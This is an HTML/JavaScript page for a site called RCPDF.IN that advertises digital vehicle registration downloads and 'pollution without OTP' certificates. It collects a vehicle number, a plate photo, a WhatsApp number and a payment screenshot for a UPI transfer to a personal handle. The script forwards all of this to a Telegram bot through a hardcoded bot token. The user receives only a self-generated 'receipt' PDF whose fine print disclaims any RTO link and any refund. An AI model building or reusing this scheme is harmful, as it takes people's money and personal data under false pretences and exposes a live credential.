<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RCPDF.IN - Digital Services</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --primary: #ff0066; --ind-blue: #003399; --yellow: #ffdb58; }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }
        
        body { 
            background: linear-gradient(180deg, #FF9933 0%, #ffffff 40%, #ffffff 60%, #138808 100%);
            background-attachment: fixed; color: #000; overflow-x: hidden; min-height: 100vh;
        }

        .header { position: fixed; top: 0; width: 100%; background: #fff; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; z-index: 1000; height: 60px; border-bottom: 3px solid var(--ind-blue); }
        .logo { color: var(--ind-blue); font-weight: 900; font-size: 22px; text-decoration: none; position: absolute; left: 50%; transform: translateX(-50%); }

        .card { margin: 90px auto 20px; width: 92%; max-width: 450px; background: rgba(255, 255, 255, 0.98); padding: 25px 20px; border-radius: 25px; text-align: center; border: 2px solid var(--ind-blue); box-shadow: 0 10px 25px rgba(0,0,0,0.2); }

        .hsrp-plate { background: #fff; width: 100%; height: 75px; border: 2px solid #000; border-radius: 12px; display: flex; align-items: center; overflow: hidden; margin-bottom: 15px; position: relative; }
        .ind-strip { background: var(--ind-blue); width: 55px; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; z-index: 2; position: absolute; left: 0; }
        .ind-strip img { width: 25px; }
        
        input[type="text"], input[type="tel"], input[type="file"] { width: 100%; padding: 15px; border-radius: 12px; border: 2px solid #ddd; margin-bottom: 12px; font-size: 16px; text-align: center; font-weight: bold; outline: none; }
        #vehInput, #pollVeh { border: none; font-size: 24px; padding-left: 65px; margin-bottom: 0; }

        .v-selector { display: flex; gap: 8px; justify-content: center; margin-bottom: 15px; }
        .v-btn { flex: 1; padding: 10px; border: 2px solid #ddd; border-radius: 10px; cursor: pointer; background: #fff; font-weight: bold; font-size: 12px; }
        .v-btn.active { background: var(--yellow); border-color: #f1c40f; }

        .btn { width: 100%; padding: 16px; border-radius: 12px; border: none; background: var(--ind-blue); color: #fff; font-size: 16px; font-weight: bold; cursor: pointer; margin-bottom: 10px; }
        .btn-row { display: flex; gap: 8px; }
        .btn-challan { background: #e67e22; flex: 1; font-size: 11px; }
        .btn-poll { background: #27ae60; flex: 1; font-size: 11px; }

        .neon-box { position: relative; padding: 3px; border-radius: 12px; background: #000; overflow: hidden; margin-bottom: 12px; }
        .neon-box::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: conic-gradient(#ff0000, #48ff00, #002bff, #ff0000); animation: rotateRGB 3s linear infinite; }
        .inner-box { position: relative; background: #fff; border-radius: 10px; padding: 10px; z-index: 1; }
        @keyframes rotateRGB { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        .loader-wrap { position: fixed; inset: 0; background: #000; z-index: 5000; display: none; flex-direction: column; justify-content: center; align-items: center; color: #fff; }
        .road { width: 80%; height: 4px; background: #333; position: relative; margin-top: 20px; }
        .car-load { font-size: 40px; position: absolute; bottom: 0; left: 0; transition: 0.1s; }
    </style>
</head>
<body>

    <div class="header">
        <b class="logo">RCPDF.IN</b>
        <button style="background:none; border:none; font-size:24px;" onclick="location.reload()">🏠</button>
    </div>

    <div class="card" id="mainPage">
        <h2 style="margin-bottom:15px; color: var(--ind-blue);">Download Digital RC</h2>
        <div class="hsrp-plate">
            <div class="ind-strip"><img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg"><span>IND</span></div>
            <input type="text" id="vehInput" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatV(this)">
        </div>
        <button class="btn" onclick="showPay('RC', 120)">CONTINUE</button>
        <div class="btn-row">
            <button class="btn btn-challan" onclick="window.location.href='https://echallan.parivahan.gov.in/index/accused-challan#challan_list'">PAY CHALLAN ONLINE</button>
            <button class="btn btn-poll" onclick="openPollution()">POLLUTION WITHOUT OTP</button>
        </div>
    </div>

    <div class="card" id="pollPage" style="display:none;">
        <h2 style="color:#27ae60; margin-bottom:5px;">POLLUTION WITHOUT OTP</h2>
        <div class="hsrp-plate">
            <div class="ind-strip"><img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg"><span>IND</span></div>
            <input type="text" id="pollVeh" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatV(this)">
        </div>
        <div class="v-selector">
            <button class="v-btn" onclick="setV(this, 'CAR')">🚗 CAR</button>
            <button class="v-btn" onclick="setV(this, 'BIKE')">🏍️ BIKE</button>
            <button class="v-btn" onclick="setV(this, 'TRUCK')">🚛 TRUCK</button>
        </div>
        <div class="neon-box">
            <div class="inner-box">
                <p style="font-size:11px; margin-bottom:5px; font-weight:bold;">UPLOAD REAR NUMBER PLATE PHOTO</p>
                <input type="file" id="rearPhoto" accept="image/*">
            </div>
        </div>
        <button class="btn" style="background:#27ae60;" onclick="showPay('POLLUTION', 125)">PROCEED TO PAY ₹125</button>
        <button class="btn" style="background:#888;" onclick="location.reload()">GO BACK</button>
    </div>

    <div class="card" id="paySection" style="display:none;">
        <h3 id="payTitle">Payment</h3>
        <img id="qr" src="" width="160" style="border:1px solid #ddd; padding:10px; border-radius:15px; margin:10px 0;">
        <p id="amtText" style="font-weight:bold;"></p>
        <input type="tel" id="mob" placeholder="WhatsApp Number" maxlength="10">
        <div class="neon-box">
            <div class="inner-box">
                <p style="font-size:11px; margin-bottom:5px; font-weight:bold;">UPLOAD PAYMENT SCREENSHOT</p>
                <input type="file" id="ss" accept="image/*">
            </div>
        </div>
        <button class="btn" onclick="finalSubmit()">VERIFY & DOWNLOAD</button>
    </div>

    <div class="loader-wrap" id="load">
        <div class="road"><div class="car-load" id="carIcon">🚗</div></div>
        <div class="pct" id="pText">0%</div>
    </div>

    <script>
        let currentType = "", currentAmt = 0, selectedVehicle = "";

        function openPollution() { document.getElementById('mainPage').style.display='none'; document.getElementById('pollPage').style.display='block'; }
        function setV(btn, type) { document.querySelectorAll('.v-btn').forEach(b => b.classList.remove('active')); btn.classList.add('active'); selectedVehicle = type; }

        function formatV(i) {
            let v = i.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
            let out = "";
            if (v.length > 0) out += v.substring(0, 2);
            if (v.length > 2) out += "-" + v.substring(2, 4);
            if (v.length > 4) out += "-" + v.substring(4, 6);
            if (v.length > 6) out += "-" + v.substring(6, 10);
            i.value = out;
        }

        function showPay(type, amt) {
            let vNo = (type === 'RC') ? document.getElementById('vehInput').value : document.getElementById('pollVeh').value;
            if(vNo.length < 10) { alert("Enter Full Vehicle Number!"); return; }
            if(type === 'POLLUTION' && (!selectedVehicle || !document.getElementById('rearPhoto').files[0])) { 
                alert("Select Vehicle Type & Upload Rear Plate Photo!"); return; 
            }
            currentType = type; currentAmt = amt;
            document.getElementById('qr').src = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=upi://pay?pa=8709610091@okbizaxis&am=${amt}.00`;
            document.getElementById('amtText').innerText = "PAY ₹" + amt;
            document.getElementById('mainPage').style.display='none'; document.getElementById('pollPage').style.display='none'; document.getElementById('paySection').style.display='block';
        }

        async function finalSubmit() {
            const m = document.getElementById('mob').value;
            const s = document.getElementById('ss').files[0];
            if(m.length < 10 || !s) { alert("Complete all details!"); return; }

            document.getElementById('load').style.display='flex';
            let p = 0;
            let iv = setInterval(async () => {
                p += 2; document.getElementById('pText').innerText = p + "%";
                document.getElementById('carIcon').style.left = (p * 0.8) + "%";
                if(p === 60) {
                    const txId = "TXN" + Math.floor(Math.random()*10000000);
                    const vNo = (currentType === 'RC') ? document.getElementById('vehInput').value : document.getElementById('pollVeh').value;
                    
                    // Old Telegram Format
                    let fd = new FormData();
                    fd.append("chat_id", "5600045707");
                    fd.append("photo", s);
                    fd.append("caption", `🚀 *NEW ORDER*\n📝 *Type:* ${currentType}\n🆔 *Txn ID:* \`${txId}\`\n🚗 *Vehicle:* ${vNo}\n📱 *Mobile:* ${m}\n💰 *Amt:* ₹${currentAmt}`);
                    fetch(`https://api.telegram.org/bot8138238341:AAGi4LxV7247hUvs_HoGLSKRhkcEapMCSuA/sendPhoto`, {method:"POST", body:fd});
                    
                    await generatePDF(txId, vNo, m);
                }
                if (p >= 100) { clearInterval(iv); location.reload(); }
            }, 80);
        }

        async function generatePDF(tx, v, m) {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();
            doc.setFillColor(0, 51, 153); doc.rect(5, 5, 200, 35, 'F');
            doc.setTextColor(255); doc.setFontSize(22); doc.text(currentType + " RECEIPT", 105, 25, null, null, "center");
            
            doc.setTextColor(0); doc.setFontSize(12);
            let y = 55;
            [["TXN ID:", tx], ["VEHICLE NO:", v], ["MOBILE NO:", m], ["AMOUNT:", "INR "+currentAmt]].forEach(r => {
                doc.rect(15, y, 180, 10); doc.text(r[0], 20, y+7); doc.text(r[1], 80, y+7); y+=10;
            });

            // QR & REAR PLATE PHOTO
            doc.addImage(document.getElementById('qr').src, 'PNG', 15, y + 10, 40, 40);
            const rearF = document.getElementById('rearPhoto').files[0];
            if(rearF) {
                const reader = new FileReader();
                reader.readAsDataURL(rearF);
                await new Promise(res => reader.onload = () => {
                    doc.addImage(reader.result, 'JPEG', 120, y + 10, 60, 40);
                    doc.setFontSize(8); doc.text("REAR PLATE PHOTO", 135, y + 55);
                    res();
                });
            }

            doc.setFontSize(9); doc.setTextColor(100);
            doc.text(["1. RCPDF.IN has no RTO link.", "2. Information only.", "3. No Refund.", "4. User responsible for details."], 15, y + 70);
            
            doc.setFont("times", "italic"); doc.setFontSize(45); doc.setTextColor(0,51,153);
            doc.text("Thank You", 105, 275, null, null, "center");
            doc.setDrawColor(0,51,153); doc.rect(5, 5, 200, 287);
            doc.save(currentType + "_Receipt.pdf");
        }
    </script>
</body>
</html>
